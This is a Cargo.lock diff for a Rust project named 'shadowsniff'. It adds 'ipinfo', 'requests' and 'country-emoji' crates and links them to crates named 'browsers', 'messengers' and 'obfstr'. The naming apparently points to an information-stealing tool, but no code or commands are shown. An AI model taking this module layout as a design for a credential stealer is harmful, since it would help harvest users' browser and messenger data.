@@ -13,6 +13,7 @@ name = "browsers"
 version = "0.1.0"
 dependencies = [
  "database",
+ "json",
  "obfstr",
  "tasks",
  "utils",
@@ -20,12 +21,16 @@ dependencies = [
 
 [[package]]
 name = "cc"
-version = "1.2.24"
+version = "1.2.25"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "16595d3be041c03b09d08d0858631facccee9221e579704070e6e9e4915d3bc7"
+checksum = "d0fc897dc1e865cc67c0e05a836d9d3f1df3cbe442aa4a9473b18e12624a4951"
 dependencies = [
  "shlex",
 ]
+
+[[package]]
+name = "country-emoji"
+version = "0.1.0"
 
 [[package]]
 name = "database"
@@ -47,6 +52,15 @@ dependencies = [
 ]
 
 [[package]]
+name = "ipinfo"
+version = "0.1.0"
+dependencies = [
+ "country-emoji",
+ "json",
+ "requests",
+]
+
+[[package]]
 name = "json"
 version = "0.1.0"
 
@@ -55,6 +69,7 @@ name = "messengers"
 version = "0.1.0"
 dependencies = [
  "obfstr",
+ "requests",
  "tasks",
  "utils",
 ]
@@ -93,11 +108,21 @@ dependencies = [
 ]
 
 [[package]]
+name = "requests"
+version = "0.1.0"
+dependencies = [
+ "json",
+ "utils",
+ "windows-sys",
+]
+
+[[package]]
 name = "shadowsniff"
 version = "0.1.0"
 dependencies = [
  "browsers",
  "ftp",
+ "ipinfo",
  "messengers",
  "miniz_oxide",
  "obfstr",
